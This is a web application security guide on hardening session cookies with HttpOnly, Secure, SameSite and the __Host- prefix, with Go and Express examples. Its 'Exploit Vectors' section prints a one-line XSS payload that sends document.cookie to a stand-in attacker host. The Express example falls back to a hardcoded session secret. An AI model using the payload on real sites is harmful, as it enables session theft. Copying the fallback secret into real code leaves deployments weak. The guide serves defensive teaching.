---
title: "Cookie Security: HttpOnly, Secure, SameSite, and the __Host- Prefix"
description: "How to harden session cookies against XSS theft, plaintext interception, CSRF, and subdomain cookie injection using HttpOnly/Secure/SameSite flags and the __Host- and __Secure- name prefixes, with Go and Node implementations."
categorySlug: "appsec-threats"
articleType: "GUIDE"
tags:
  - "cookie-security"
  - "httponly"
  - "samesite"
  - "host-prefix"
  - "session-hijacking"
  - "subdomain-takeover"
---

# Cookie Security: Programmatic Hardening of HttpOnly, Secure, SameSite, and the `__Host-` Prefix

Cookies remain the most resilient transport for stateful session tokens in web browsers. But cookies are a double-edged sword: without explicit boundary attributes, they are highly susceptible to exfiltration via Cross-Site Scripting (XSS), interception in transit over cleartext channels, forced replay through Cross-Site Request Forgery (CSRF), and — a threat many teams miss — **injection from a compromised sibling subdomain**.

---

## The Problem: The Default Vulnerable Cookie

By default, when an application issues a cookie (`Set-Cookie: session=xyz`), the browser implements a highly relaxed security model: it permits any client-side JavaScript execution context to read and write the cookie, allows transmission over unencrypted HTTP, and automatically attaches the cookie to outbound requests originating from third-party sites.

```text
       +-----------------------------------------------------------------+
       |                  Cookie Security Flag Bounds                    |
       +-----------------------------------------------------------------+

                  [ Third-Party Site (evil.com) ]
                                |
                        (Initiates POST)
                                |
                                v
                    [ Target API (victim.com) ]
                                |
                    Is SameSite flag set to Strict?
                        /               \
                    [ Yes ]            [ No ]
                       /                   \
         Block Cookie Attachment      Permit Cookie (CSRF Exploit!)

                               ---

                    [ XSS Payload Executing ]
                                |
                        (Reads document.cookie)
                                |
                                v
                    Is HttpOnly flag set?
                        /               \
                    [ Yes ]            [ No ]
                       /                   \
         Returns Empty (Protected)    Returns Token (Session Stolen!)
```

There is a third, less-discussed vector: **subdomain cookie injection**. If a cookie is scoped with a `Domain` attribute (e.g., `Domain=.company.com`), *any* subdomain — including a compromised, forgotten, or lower-security one like `vulnerable.company.com` — can write or overwrite a cookie of that same name for the whole parent domain. If the high-security parent application (`company.com`) trusts that cookie implicitly, an attacker who only compromises the weak subdomain can fixate a session on the flagship app.

```text
       [ Vulnerable Subdomain ]                     [ Target Parent Domain ]
       (vulnerable.company.com)                          (company.com)
                  |                                            |
                  |-- 1. Writes cookie to parent: ------------>|
                  |      Domain=.company.com                   |
                  |      Name=SESSION, Value=compromised_id    |
                  |                                            |
                  |                                            |-- 2. Victim visits company.com
                  |                                            |      (Browser sends both parent and
                  |                                            |       injected cookies!)
                  |                                            |
                  |                                            |-- 3. App reads injected SESSION!
                  |                                            v
                                              [ SESSION FIXATION COMPROMISE ]
```

---

## Vulnerable Code: The Default Cookie Issuer

```javascript
// VULNERABLE EXPRESS COOKIE ISSUER
const express = require('express');
const app = express();

app.post('/api/v1/auth/login', (req, res) => {
    // Assume user validated...
    const sessionToken = "17e42fa09bb3901bcfd1283";

    // VULNERABILITY: Setting cookie with no security attributes.
    // 1. Missing HttpOnly -> Vulnerable to XSS token theft.
    // 2. Missing Secure -> Transmitted in plaintext over HTTP.
    // 3. Missing SameSite -> Vulnerable to CSRF attacks.
    // 4. Missing Domain restriction -> vulnerable to subdomain injection if a Domain is ever added later.
    res.setHeader('Set-Cookie', `session_id=${sessionToken}; Path=/`);

    return res.status(200).json({ success: true });
});
```

### Exploit Vectors

1. **XSS exfiltration:** If the site suffers an HTML injection or DOM-based XSS, an attacker steals the session cookie:
   ```javascript
   fetch(`https://attacker-logger.com/log?cookie=${encodeURIComponent(document.cookie)}`);
   ```
2. **CSRF abuse:** The victim visits `evil.com`, which executes a hidden form POST to `https://target-app.com/api/v1/user/update-email`. Because `SameSite` is not set, the browser automatically attaches `session_id`, authorizing the attacker's change.
3. **Subdomain injection:** A compromised `blog.target-app.com` sets `Domain=.target-app.com` on a same-named session cookie, fixating a session the attacker controls onto the main application.

---

## Programmatic Hardening: The Five-Attribute Boundary

1. **`HttpOnly`** — blocks client-side JavaScript (`document.cookie`) from accessing the cookie. Even if XSS exists, the attacker cannot read the token directly.
2. **`Secure`** — directs the browser to only transmit the cookie over encrypted TLS (HTTPS).
3. **`SameSite`** — controls whether cookies are sent with cross-site requests:
   * `Strict` — never sent on cross-site requests (even clicking an external link to your site withholds it initially).
   * `Lax` — balanced default; sent on safe top-level GET navigations but withheld on cross-site sub-requests (image loads, POST forms).
4. **`__Secure-` prefix** — the browser refuses to set the cookie unless it carries the `Secure` attribute.
5. **`__Host-` prefix** — the strictest guardrail. The browser refuses to set the cookie unless it: has `Secure`; is set from an HTTPS page; defines `Path=/`; and has **no** `Domain` attribute at all — which is exactly what neutralizes subdomain cookie injection, since the cookie becomes bound strictly to the exact host that set it.

---

## Production-Ready Secure Cookie Implementation (Go)

```go
package cookie

import (
	"net/http"
	"time"
)

// IssueSecureSessionCookie issues a host-bound, high-security cookie to the client.
func IssueSecureSessionCookie(w http.ResponseWriter, token string) {
	// We use the '__Host-' prefix to mandate Secure, HTTPS, and restrict domain scoping.
	cookieName := "__Host-SessionToken"

	cookie := &http.Cookie{
		Name:     cookieName,
		Value:    token,
		Path:     "/", // Must be root when using __Host- prefix
		HttpOnly: true, // Prevents access via client-side scripts
		Secure:   true, // Mandates encrypted transmission only

		// SameSiteLax provides robust security for general APIs.
		// Use SameSiteStrict for high-value administrative interfaces.
		SameSite: http.SameSiteLaxMode,

		// Enforce lifetime (e.g., 2 hours max expiry)
		MaxAge:  7200,
		Expires: time.Now().Add(2 * time.Hour),

		// We explicitly do NOT set the Domain field.
		// By omitting it, the browser locks this cookie ONLY to the issuing host
		// (e.g., app.target.com) and prevents subdomain delegation entirely
		// (e.g., vulnerable.dev.target.com cannot write/override it).
	}

	http.SetCookie(w, cookie)
}

// ClearSessionCookie securely clears the session cookie from the client.
func ClearSessionCookie(w http.ResponseWriter) {
	cookie := &http.Cookie{
		Name:     "__Host-SessionToken",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
		MaxAge:   -1, // Instructs the browser to instantly delete the cookie
		Expires:  time.Unix(0, 0),
	}
	http.SetCookie(w, cookie)
}
```

## Production-Ready Secure Session Middleware (Node.js/Express)

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const app = express();

const redisClient = createClient({ url: process.env.REDIS_URL || 'redis://localhost:6379' });
redisClient.connect().catch(console.error);

// Ensure your reverse proxy (Nginx, ALB, Cloudflare) is trusted, because express-session
// checks 'x-forwarded-proto' to confirm HTTPS was actually used end-to-end.
app.set('trust proxy', 1);

app.use(session({
    store: new RedisStore({ client: redisClient }),
    secret: process.env.SESSION_SIGNING_SECRET || 'high-entropy-signature-key-32-bytes!',
    resave: false,
    saveUninitialized: false,

    name: '__Host-SESSION', // Command the browser to lock this cookie directly to the host
    cookie: {
        httpOnly: true,        // Defeats XSS-based document.cookie theft
        secure: true,          // TLS-only transmission
        sameSite: 'Lax',       // Defeats classic CSRF
        path: '/',             // Required for __Host- validation
        domain: undefined,     // Required for __Host- validation — omitting this blocks subdomain sharing
        maxAge: 1000 * 60 * 60 * 2
    }
}));

app.post('/api/v1/auth/login', (req, res) => {
    // Authenticate credentials...
    req.session.userId = 'usr-104958';
    req.session.role = 'AUTHORIZED_ADMIN';
    res.status(200).json({ status: 'success', message: 'Logged in. Session locked via __Host- prefix.' });
});

module.exports = app;
```

---

## Architectural Protections

1. **Never omit prefixes:** Always use `__Host-` on primary authentication/session cookies to enforce domain locking against subdomain injection; use `__Secure-` for other high-value cookies that require broader subdomain scope but still need HTTPS-only transport.
2. **Standardize on `SameSite=Lax`/`Strict`:** Never allow session cookies to default to `SameSite=None` unless cross-site federation is a specific, reviewed requirement.
3. **Minimize lifetime:** Set conservative `Max-Age`/`Expires` values; avoid multi-month cookie validity for session storage.
4. **Session-to-fingerprint binding:** Track the client IP subnet and user-agent string at session creation. If a later request on the same session ID mismatches, invalidate the session server-side immediately.
